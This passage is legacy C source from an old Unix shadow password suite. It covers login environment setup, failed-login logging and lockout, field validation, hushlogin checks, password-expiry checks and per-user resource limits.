			pwent->pw_age[1] = i64c (spwd->sp_min / 7);

			cp = l64a (spwd->sp_lstchg / 7);
			pwent->pw_age[2] = cp[0];
			pwent->pw_age[3] = cp[1];

			pwent->pw_age[4] = '\0';
#endif
			endspent ();
			return;
		}
		endspent ();
#endif
		pwent->pw_passwd = xstrdup (passwd->pw_passwd);
#ifdef	ATT_AGE
		pwent->pw_age = xstrdup (passwd->pw_age);
#endif
	}
}
/*
 * Copyright 1989 - 1992, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: env.c,v 1.3 1996/09/25 03:19:56 marekm Exp $")

#include <stdio.h>
#include <stdlib.h>
#include "defines.h"

/*
 * NEWENVP_STEP must be a power of two.  This is the number
 * of (char *) pointers to allocate at a time, to avoid using
 * realloc() too often.
 */ 
#define NEWENVP_STEP 16

size_t newenvc = 0;
char **newenvp = NULL;

char *xmalloc();
char *xstrdup();

static char * const forbid[] = {
	"ENV=",
	"BASH_ENV=",	/* GNU creeping featurism strikes again... */
	"HOME=",
	"IFS=",
	"LD_",		/* anything with the LD_ prefix */
	"PATH=",
	"SHELL=",
	(char *) 0
};


/*
 * initenv() must be called once before using addenv().
 */
void
initenv()
{
	newenvp = (char **)xmalloc(NEWENVP_STEP * sizeof(char *));
	*newenvp = NULL;
}


void
addenv(string, value)
	const char *string;
	const char *value;
{
	char *cp, *newstring;
	size_t i;
	size_t n;

	if (value) {
		newstring = xmalloc(strlen(string) + strlen(value) + 2);
		sprintf(newstring, "%s=%s", string, value);
	} else {
		newstring = xstrdup(string);
	}

	/*
	 * Search for a '=' character within the string and if none is found
	 * just ignore the whole string.
	 */

	cp = strchr(newstring, '=');
	if (!cp) {
		free(newstring);
		return;
	}

	n = (size_t)(cp - newstring);

	for (i = 0; i < newenvc; i++) {
		if (strncmp(newstring, newenvp[i], n) == 0 &&
		    (newenvp[i][n] == '=' || newenvp[i][n] == '\0'))
			break;
	}

	if (i < newenvc) {
		free(newenvp[i]);
		newenvp[i] = newstring;
		return;
	}

	newenvp[newenvc++] = newstring;

	/*
	 * Check whether newenvc is a multiple of NEWENVP_STEP.
	 * If so we have to resize the vector.
	 * the expression (newenvc & (NEWENVP_STEP - 1)) == 0
	 * is equal to    (newenvc %  NEWENVP_STEP) == 0
	 * as long as NEWENVP_STEP is a power of 2.
	 */

	if ((newenvc & (NEWENVP_STEP - 1)) == 0) {
		extern char **environ;
		char **__newenvp;
		size_t newsize;

		/*
		 * If the resize operation succeds we can
		 * happily go on, else print a message.
		 */

		newsize = (newenvc + NEWENVP_STEP) * sizeof(char *);
		__newenvp = (char **)realloc(newenvp, newsize);

		if (__newenvp) {
			/*
			 * If this is our current environment, update
			 * environ so that it doesn't point to some
			 * free memory area (realloc() could move it).
			 */
			if (environ == newenvp)
				environ = __newenvp;
			newenvp = __newenvp;
		} else {
			fprintf(stderr, "Environment overflow\n");
			free(newenvp[--newenvc]);
		}
	}

	/*
	 * The last entry of newenvp must be NULL
	 */

	newenvp[newenvc] = NULL;
}


/*
 * set_env - copy command line arguments into the environment
 */
void
set_env(argc, argv)
	int argc;
	char * const *argv;
{
	int	noname = 1;
	char	variable[BUFSIZ];
	char	*cp;

	for ( ; argc > 0; argc--, argv++) {
		if (strlen(*argv) >= sizeof variable)
			continue;	/* ignore long entries */

		if (! (cp = strchr (*argv, '='))) {
			sprintf(variable, "L%d", noname++);
			addenv(variable, *argv);
		} else {
			char * const *p;

			for (p = forbid; *p; p++)
				if (strncmp(*argv, *p, strlen(*p)) == 0)
					break;

			if (*p) {
				strncpy(variable, *argv, cp - *argv);
				variable[cp - *argv] = '\0';
				printf("You may not change $%s\n", variable);
				continue;
			}

			addenv(*argv, NULL);
		}
	}
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: failure.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <fcntl.h>
#include <stdio.h>
#include "defines.h"
#include "faillog.h"
#include "getdef.h"

#include <utmp.h>

#define	YEAR	(365L*DAY)

/*
 * failure - make failure entry
 *
 *	failure() creates a new (struct faillog) entry or updates an
 *	existing one with the current failed login information.
 */

void
failure (uid, tty, fl)
	int uid;
	const char *tty;
	struct faillog *fl;
{
	int	fd;

	/*
	 * Do do anything if failure logging isn't set up.
	 */

	if ((fd = open (FAILFILE, O_RDWR)) < 0)
		return;

	/*
	 * The file is indexed by uid value meaning that shared UID's
	 * share failure log records.  That's OK since they really
	 * share just about everything else ...
	 */

	lseek (fd, (off_t) (sizeof *fl) * uid, SEEK_SET);
	if (read (fd, (char *) fl, sizeof *fl)
			!= sizeof *fl)
		bzero ((char *) fl, sizeof *fl);

	/*
	 * Update the record.  We increment the failure count to log the
	 * latest failure.  The only concern here is overflow, and we'll
	 * check for that.  The line name and time of day are both
	 * updated as well.
	 */

	if (fl->fail_cnt + 1 > 0)
		fl->fail_cnt++;

	strncpy (fl->fail_line, tty, sizeof fl->fail_line);
	fl->fail_time = time ((time_t *) 0);

	/*
	 * Seek back to the correct position in the file and write the
	 * record out.  Ideally we should lock the file in case the same
	 * account is being logged simultaneously.  But the risk doesn't
	 * seem that great.
	 */

	lseek (fd, (off_t) (sizeof *fl) * uid, SEEK_SET);
	write (fd, (char *) fl, sizeof *fl);
	close (fd);
}

/*
 * failcheck - check for failures > allowable
 *
 *	failcheck() is called AFTER the password has been validated.  If the
 *	account has been "attacked" with too many login failures, failcheck()
 *	returns FALSE to indicate that the login should be denied even though
 *	the password is valid.
 */

int
failcheck (uid, fl, failed)
	int uid;
	struct faillog *fl;
	int failed;
{
	int	fd;
	struct	faillog	fail;

	/*
	 * Suppress the check if the log file isn't there.
	 */

	if ((fd = open (FAILFILE, O_RDWR)) < 0)
		return (1);

	/*
	 * Get the record from the file and determine if the user has
	 * exceeded the failure limit.  If "max" is zero, any number
	 * of failures are permitted.  Only when "max" is non-zero and
	 * "cnt" is greater than or equal to "max" is the account
	 * considered to be locked.
	 *
	 * If read fails, there is no record for this user yet (the
	 * file is initially zero length and extended by writes), so
	 * no need to reset the count.
	 */

	lseek (fd, (off_t) (sizeof *fl) * uid, SEEK_SET);
	if (read(fd, (char *) fl, sizeof *fl) != sizeof *fl) {
		close(fd);
		return 1;
	}

	if (fl->fail_max != 0
		&& fl->fail_cnt >= fl->fail_max)
#ifdef FAILLOG_LOCKTIME
	if (fl->fail_locktime == 0
		|| time((time_t *)0) < fl->fail_time + fl->fail_locktime)
#endif
	{
		close(fd);
		return 0;
	}

	/*
	 * The record is updated if this is not a failure.  The count will
	 * be reset to zero, but the rest of the information will be left
	 * in the record in case someone wants to see where the failed
	 * login originated.
	 */

	if (!failed) {
		fail = *fl;
		fail.fail_cnt = 0;

		lseek (fd, (off_t) sizeof fail * uid, SEEK_SET);
		write (fd, (char *) &fail, sizeof fail);
	}
	close (fd);
	return 1;
}

/*
 * failprint - print line of failure information
 *
 *	failprint takes a (struct faillog) entry and formats it into a
 *	message which is displayed at login time.
 */

void
failprint (fail)
	const struct faillog *fail;
{
	struct	tm	*tp;
#if HAVE_STRFTIME
	char	lasttimeb[256];
	char	*lasttime = lasttimeb;
	const char *fmt;
#else
	char	*lasttime;
#endif
	time_t NOW;

	if (fail->fail_cnt == 0)
		return;

	tp = localtime (&(fail->fail_time));
	time(&NOW);

#if HAVE_STRFTIME
	/*
	 * Only print as much date and time info as it needed to
	 * know when the failure was.
	 */

	if (NOW - fail->fail_time >= YEAR)
		fmt = "%Y";
	else if (NOW - fail->fail_time >= DAY)
		fmt = "%A %T";
	else
		fmt = "%T";
	strftime(lasttimeb, sizeof lasttimeb, fmt, tp);
#else

	/*
	 * Do the same thing, but don't use strftime since it
	 * probably doesn't exist on this system
	 */

	lasttime = asctime (tp);
	lasttime[24] = '\0';

	if (NOW - fail->fail_time < YEAR)
		lasttime[19] = '\0';
	if (NOW - fail->fail_time < DAY)
		lasttime = lasttime + 11;

	if (*lasttime == ' ')
		lasttime++;
#endif
	printf ("%d %s since last login.  Last was %s on %s.\n",
		fail->fail_cnt, fail->fail_cnt > 1 ? "failures":"failure",
		lasttime, fail->fail_line);
}

/*
 * failtmp - update the cummulative failure log
 *
 *	failtmp updates the (struct utmp) formatted failure log which
 *	maintains a record of all login failures.
 */

void
failtmp (failent)
struct	utmp	*failent;
{
	int	fd;
	char	*ftmp;

	/*
	 * Get the name of the failure file.  If no file has been defined
	 * in login.defs, don't do this.
	 */

	if ((ftmp = getdef_str ("FTMP_FILE")) == 0)
		return;

	/*
	 * Open the file for append.  It must already exist for this
	 * feature to be used.
	 */

	if ((fd = open (ftmp, O_WRONLY|O_APPEND)) == -1)
		return;

	/*
	 * Output the new failure record and close the log file.
	 */

	write (fd, (char *) failent, sizeof *failent);
	close (fd);
}
/*
 * Copyright 1990, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: fields.c,v 1.2 1996/09/25 03:19:56 marekm Exp $")

#include <ctype.h>
#include <string.h>
#include <stdio.h>

/*
 * valid_field - insure that a field contains all legal characters
 *
 * The supplied field is scanned for non-printing and other illegal
 * characters.  If any illegal characters are found, valid_field
 * returns -1.  Zero is returned for success.
 */

int
valid_field(field, illegal)
	const char *field;
	const char *illegal;
{
	const char *cp;

	for (cp = field;*cp && isprint (*cp) && ! strchr (illegal, *cp);cp++)
		;

	if (*cp)
		return -1;
	else
		return 0;
}

/*
 * change_field - change a single field if a new value is given.
 *
 * prompt the user with the name of the field being changed and the
 * current value.
 */

/* sizeof(buf) must be at least BUFSIZ chars!  --marekm */

void
change_field(buf, maxsize, prompt)
	char *buf;
	size_t maxsize;
	const char *prompt;
{
	char	new[BUFSIZ];
	char	*cp;

	if (maxsize > sizeof(new))
		maxsize = sizeof(new);

	printf ("\t%s [%s]: ", prompt, buf);
	if (fgets(new, maxsize, stdin) != new)
		return;

	if (!(cp = strchr (new, '\n')))
		return;
	*cp = '\0';

	if (new[0]) {
		/*
		 * Remove leading and trailing whitespace.  This also
		 * makes it possible to change the field to empty, by
		 * entering a space.  --marekm
		 */

		while (--cp >= new && isspace(*cp))
			;
		*++cp = '\0';

		cp = new;
		while (*cp && isspace(*cp))
			cp++;

		strncpy(buf, cp, maxsize - 1);
		buf[maxsize - 1] = '\0';
	}
}
/*
 * Copyright 1991, 1993, John F. Haugh II and Chip Rosenthal
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: hushed.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include "defines.h"
#include <pwd.h>

extern char *getdef_str();

/*
 * hushed - determine if a user receives login messages
 *
 * Look in the hushed-logins file (or user's home directory) to see
 * if the user is to receive the login-time messages.
 */

int
hushed(pw)
	struct passwd *pw;
{
	char *hushfile;
	char buf[BUFSIZ];
	int found;
	FILE *fp;

	/*
	 * Get the name of the file to use.  If this option is not
	 * defined, default to a noisy login.
	 */

	if ( (hushfile=getdef_str("HUSHLOGIN_FILE")) == NULL )
		return 0;

	/*
	 * If this is not a fully rooted path then see if the
	 * file exists in the user's home directory.
	 */

	if (hushfile[0] != '/') {
		strcat(strcat(strcpy(buf, pw->pw_dir), "/"), hushfile);
		return (access(buf, 0) == 0);
	}

	/*
	 * If this is a fully rooted path then go through the file
	 * and see if this user is in there.
	 */

	if ((fp = fopen(hushfile, "r")) == NULL)
		return 0;

	for (found = 0;! found && fgets (buf, sizeof buf, fp);) {
		buf[strlen (buf) - 1] = '\0';
		found = ! strcmp (buf,
			buf[0] == '/' ? pw->pw_shell:pw->pw_name);
	}
	(void) fclose(fp);
	return found;
}
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Extracted from age.c and made part of libshadow.a - may be useful
 * in other shadow-aware programs.  --marekm
 */

#include <config.h>

#include <sys/types.h>
#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

#ifdef  HAVE_USERSEC_H
#include <userpw.h>
#include <usersec.h>
#include <userconf.h>
#endif

#ifndef	AGING
#if defined(SHADOWPWD) || defined(HAVE_USERSEC_H)
#define AGING	1
#endif
#else
#if !defined(SHADOWPWD) && !defined(HAVE_USERSEC_H) && !defined(ATT_AGE)
#undef AGING
#endif
#endif

#if defined(SHADOWPWD) || defined(AGING) /*{*/

#include "rcsid.h"
RCSID("$Id: isexpired.c,v 1.3 1996/09/25 03:19:56 marekm Exp $")

extern	time_t	time ();

/*
 * isexpired - determine if account is expired yet
 *
 *	isexpired calculates the expiration date based on the
 *	password expiration criteria.
 */

/*ARGSUSED*/

#ifdef	SHADOWPWD
int
isexpired(pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
#else
int
isexpired(pw)
	const struct passwd *pw;
#endif
{
	long	now;
#ifdef	HAVE_USERSEC_H
	int	minage = 0;
	int	maxage = 10000;
	int	curage = 0;
	struct	userpw	*pu;
#endif

	now = time ((time_t *) 0) / SCALE;

#ifdef	SHADOWPWD

	if (!sp)
		sp = pwd_to_spwd(pw);

	/*
	 * Quick and easy - there is an expired account field
	 * along with an inactive account field.  Do the expired
	 * one first since it is worse.
	 */

	if (sp->sp_expire > 0 && now >= sp->sp_expire)
		return 3;

	/*
	 * Last changed date 1970-01-01 (not very likely) means that
	 * the password must be changed on next login (passwd -e).
	 *
	 * The check for "x" is a workaround for RedHat NYS libc bug -
	 * if /etc/shadow doesn't exist, getspnam() still succeeds and
	 * returns sp_lstchg==0 (must change password) instead of -1!
	 */
	if (sp->sp_lstchg == 0 && strcmp(pw->pw_passwd, "x") != 0)
		return 1;

	if (sp->sp_lstchg > 0 && sp->sp_max >= 0 && sp->sp_inact >= 0 &&
			now >= sp->sp_lstchg + sp->sp_max + sp->sp_inact)
		return 2;
#endif
#ifdef	HAVE_USERSEC_H	/*{*/
        /*
         * The aging information lives someplace else.  Get it from the
         * login.cfg file
         */

        if (getconfattr (SC_SYS_PASSWD, SC_MINAGE, &minage, SEC_INT))
                minage = -1;

        if (getconfattr (SC_SYS_PASSWD, SC_MAXAGE, &maxage, SEC_INT))
                maxage = -1;

        pu = getuserpw (pw->pw_name);
        curage = (time (0) - pu->upw_lastupdate) / (7*86400L);

	if (maxage != -1 && curage > maxage)
		return 1;
#else	/*} !HAVE_USERSEC_H */

	/*
	 * The last and max fields must be present for an account
	 * to have an expired password.  A maximum of >10000 days
	 * is considered to be infinite.
	 */

#ifdef	SHADOWPWD
	if (sp->sp_lstchg == -1 ||
			sp->sp_max == -1 || sp->sp_max >= (10000L*DAY/SCALE))
		return 0;
#endif
#ifdef	ATT_AGE
	if (pw->pw_age[0] == '\0' || pw->pw_age[0] == '/')
		return 0;
#endif

	/*
	 * Calculate today's day and the day on which the password
	 * is going to expire.  If that date has already passed,
	 * the password has expired.
	 */

#ifdef	SHADOWPWD
	if (now >= sp->sp_lstchg + sp->sp_max)
		return 1;
#endif
#ifdef	ATT_AGE
	if (a64l (pw->pw_age + 2) + c64i (pw->pw_age[1]) < now / 7)
		return 1;
#endif
#endif	/*} HAVE_USERSEC_H */
	return 0;
}
#endif /*}*/
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Separated from setup.c.  --marekm
 * Resource limits thanks to Cristian Gafton.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: limits.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>

#include <stdio.h>

#include "prototypes.h"
#include "defines.h"
#include <pwd.h>
#include "getdef.h"

#ifdef HAVE_SYS_RESOURCE_H
#include <sys/resource.h>
#define LIMITS
#endif

#ifdef LIMITS

#ifndef LIMITS_FILE
#define LIMITS_FILE "/etc/limits"
#endif

#define LOGIN_ERROR_RLIMIT	1
#define LOGIN_ERROR_LOGIN	2

/* Set a limit on a resource */
static int
setrlimit_value(rlimit, value, multiplier)
	unsigned int rlimit;	/* RLIMIT_XXXX */
	const char *value;	/* string value to be read */
	unsigned int multiplier; /* value*multiplier is the actual limit */
{
	struct rlimit rlim;
	long limit;
	char **endptr = (char **) &value;
	const char *value_orig = value;

	limit = strtol(value, endptr, 10);
	if (limit == 0 && value_orig == *endptr) /* no chars read */
		return 0;
	limit *= multiplier;
	rlim.rlim_cur = limit;
	rlim.rlim_max = limit;
	if (setrlimit(rlimit, &rlim))
		return LOGIN_ERROR_RLIMIT;
	return 0;
}

/* Counts the number of user logins and check against the limit*/
static int
check_logins(name, maxlogins)
	const char *name;
	const char *maxlogins;
{
	struct utmp *ut;
	unsigned int limit, count;
	char **endptr = (char **) &maxlogins;
	const char *ml_orig = maxlogins;

	limit = strtol(maxlogins, endptr, 10);
	if (limit == 0 && ml_orig == *endptr) /* no chars read */
		return 0;

	if (limit == 0) /* maximum 0 logins ? */ {
		SYSLOG((LOG_WARN, "No logins allowed for `%s'\n", name));
		return LOGIN_ERROR_LOGIN;
	}

	setutent();
	count = 0;
	while ((ut = getutent())) {
#ifdef USER_PROCESS
		if (ut->ut_type != USER_PROCESS)
			continue;
#endif
		if (ut->UT_USER[0] == '\0')
			continue;
		if (strncmp(name, ut->UT_USER, sizeof(ut->UT_USER)) != 0)
			continue;
		if (++count >= limit)
			break;
	}
	endutent();
	if (count >= limit) {
		SYSLOG((LOG_WARN, "Too many logins (max %d) for %s\n",
			limit, name));
		return LOGIN_ERROR_LOGIN;
	}
	return 0;
}

/* Function setup_user_limits - checks/set limits for the curent login
 * Original idea from Joel Katz's lshell. Ported to shadow-login
 * by Cristian Gafton - gafton@sorosis.ro
 *
 * We are passed a string of the form ('BASH' constants for ulimit)
 *     [Cc][Dd][Ff][Mm][Nn][Rr][Ss][Tt][Uu][Ll]
 *     (eg. 'C2F256D2048N5' or 'C2 F256 D2048 N5')
 * where:
 * [Cc]: c = RLIMIT_CORE	max core file size (KB)
 * [Dd]: d = RLIMIT_DATA	max data size (KB)
 * [Ff]: f = RLIMIT_FSIZE	Maximum filesize (KB)
 * [Mm]: m = RLIMIT_MEMLOCK	max locked-in-memory address space (KB)
 * [Nn]: n = RLIMIT_NOFILE	max number of open files
 * [Rr]: r = RLIMIT_RSS		max resident set size (KB)
 * [Ss]: s = RLIMIT_STACK	max stack size (KB)
 * [Tt]: t = RLIMIT_CPU		max CPU time (MIN)
 * [Uu]: u = RLIMIT_NPROC	max number of processes
 * [Ll]: l = max number of logins for this user
 *
 * Return value:
 *		0 = okay, of course
 *		LOGIN_ERROR_RLIMIT = error setting some RLIMIT
 *		LOGIN_ERROR_LOGIN  = error - too many logins for this user
 */
static int
do_user_limits(buf, name)
	const char *buf;	/* the limits string */
	const char *name;	/* the username */
{
	const char *pp;
	int retval = 0;

	pp=buf;

	while (*pp != '\0') switch(*pp++) {
#ifdef RLIMIT_CPU
		case 't':
		case 'T':
			/* RLIMIT_CPU - max CPU time (MIN) */
			retval |= setrlimit_value(RLIMIT_CPU, pp, 60);
			break;
#endif
#ifdef RLIMIT_DATA
		case 'd':
		case 'D':
			/* RLIMIT_DATA - max data size (KB) */
			retval |= setrlimit_value(RLIMIT_DATA, pp, 1024);
			break;
#endif
#ifdef RLIMIT_FSIZE
		case 'f':
		case 'F':
			/* RLIMIT_FSIZE - Maximum filesize (KB) */
			retval |= setrlimit_value(RLIMIT_FSIZE, pp, 1024);
			break;
#endif
#ifdef RLIMIT_NPROC
		case 'u':
		case 'U':
			/* RLIMIT_NPROC - max number of processes */
			retval |= setrlimit_value(RLIMIT_NPROC, pp, 1);
			break;
#endif
#ifdef RLIMIT_CORE
		case 'c':
		case 'C':
			/* RLIMIT_CORE - max core file size (KB) */
			retval |= setrlimit_value(RLIMIT_CORE, pp, 1024);
			break;
#endif
